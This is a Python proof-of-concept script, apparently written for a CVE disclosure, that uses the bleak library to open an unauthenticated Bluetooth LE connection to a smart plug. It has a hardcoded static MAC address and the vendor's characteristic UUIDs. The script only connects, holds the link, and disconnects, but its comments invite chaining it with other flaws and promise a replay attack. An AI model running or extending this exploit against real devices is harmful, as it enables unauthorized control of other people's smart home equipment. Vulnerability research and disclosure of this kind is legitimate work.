# IMPROPER ACCESS CONTROL // CVE #2


# IMPORTS
import asyncio, argparse
from bleak import BleakClient



MAC = "99:B9:05:1E:35:BC" # <-- MY DEVICE // DEVICE ALSO DOESNT IMPLEMENT RPA (Rotating Private Address) --> MEANING THIS DEVICE USES A STATIC MAC ADDRESS
        #  CHANGE MAC IF NEED        //        THIS CAN FURTHER PERSIST IN ALLOWING THE TARGET TO BE TARGETED INDEFINETLY AFTER OBTAINING MAC ADDRESS ONCE


FD50 = "0000fd50-0000-1000-8000-00805f9b34fb"             # <-- CUSTOM VENDOR SERVICE -->  Vulnerable to little to no security precautions
CHARACTERISTIC_1 = "00000001-0000-1001-8001-00805f9b07d0" # SDP    <-- Properties = write-without-response,write
CHARACTERISTIC_2 = "00000002-0000-1001-8001-00805f9b07d0" # RFCOMM <-- Properties = read
CHARACTERISTIC_3 = "00000003-0000-1001-8001-00805f9b07d0" # UNKOWN <-- Properties = notify



class POC():
    """Improper Access Control"""



    @classmethod
    async def _connect(cls, mac: str, timeout=10):
        """Perform unauthorized connection"""


        print("[*] Attempting connection...")
        


        try:

            client = BleakClient(address_or_ble_device=mac, timeout=timeout, pair=False)

            await client.connect();   print(f"\n[+] Successfully connected to: {mac} ")
            await asyncio.sleep(3) # <-- PROOF THAT USER CAN CONNECT TO TARGET ( Smart plug ) & Stay connected --> CHAIN WITH ANOTHER VULNERABILITIY TO CONTROL DEVICE


            # SPACE FOR FURTHER LOGIC ALLOWING THE USER TO BUILD UPON THIS VULNERABILITY FOR FURTHER EXPLOTATION --> ( REPLAY ATTACK ) <-- COMING SOON 







            await client.disconnect(); print(f"\n[-] Gracefully disconnected!")
        

        except Exception as e:
            print(f"[!] Exception Error: {e}")
    


    @staticmethod
    def main():
        """Get MAC"""


        parser = argparse.ArgumentParser()
        parser.add_argument("-m", help="Pass target MAC Address")
        args = parser.parse_args()

        mac = args.m if args.m else MAC 

        if not  mac: print("[!] Enter target MAC Address silly!"); exit()
        asyncio.run(POC._connect(mac=mac))
        

if __name__ == "__main__": 
    POC.main()

